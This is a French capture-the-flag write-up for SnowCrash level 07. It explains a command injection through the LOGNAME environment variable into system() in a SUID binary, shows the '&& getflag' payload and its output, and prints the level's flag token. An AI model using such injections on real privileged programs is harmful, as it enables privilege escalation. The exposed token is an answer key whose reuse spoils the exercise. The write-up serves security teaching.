# Niveau 07 : Injection de Commande via Variable d'Environnement

## Aperçu

Dans ce niveau, nous avons rencontré un binaire SUID (`level07`) appartenant à `flag07` qui était vulnérable à l'injection de commande via les variables d'environnement.

## Analyse

### Examen Initial

Lorsque nous vérifions le binaire pour la première fois :

```console
level07@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

Le binaire a le bit SUID activé (notez le 's' dans les permissions), ce qui signifie qu'il s'exécute avec les privilèges de son propriétaire (`flag07`).

Lorsqu'il est exécuté, le binaire affiche simplement "level07" :

```console
level07@SnowCrash:~$ ./level07
level07
```

### Analyse du Binaire

L'analyse à l'aide d'un décompilateur comme Ghidra, qui tente de reconstruire un code source de type C à partir du binaire compilé, révèle la logique vulnérable principale :

```c
  // Extrait décompilé par Ghidra (les noms de variables peuvent légèrement différer)
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
```

Ce code montre explicitement que le programme :

1.  Récupère la variable d'environnement `LOGNAME` en utilisant `getenv`.
2.  Met en forme cette valeur dans une chaîne de commande `/bin/echo %s ` en utilisant `asprintf`.
3.  Exécute la chaîne de commande résultante en utilisant `system()`.

La vulnérabilité réside dans l'incorporation directe de la valeur non désinfectée de `LOGNAME` dans la chaîne de commande passée à `system()`.

## Exploitation

La vulnérabilité peut être exploitée en modifiant la variable d'environnement `LOGNAME` pour inclure des commandes shell :

```console
level07@SnowCrash:~$ export LOGNAME="&& getflag"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### Comment ça marche :

1.  Nous définissons `LOGNAME` à `"&& getflag"`.
2.  Lorsque le programme exécute `system("/bin/echo %s", getenv("LOGNAME"))`, il exécute effectivement :
    ```
    system("/bin/echo && getflag")
    ```
3.  Dans la syntaxe shell, l'opérateur `&&` exécute la deuxième commande si la première réussit.
4.  `/bin/echo` sans arguments affiche simplement une nouvelle ligne et se termine avec succès.
5.  Ensuite, `getflag` s'exécute avec les privilèges de `flag07`, nous donnant le jeton.

## Leçon de Sécurité

Ce niveau démontre le danger de passer des entrées utilisateur ou des variables d'environnement non désinfectées à des fonctions comme `system()`. Validez et désinfectez toujours toute entrée qui pourrait affecter l'exécution de commandes.

## Jeton

```
fiumuikeil55xe9cu4dood66h
```
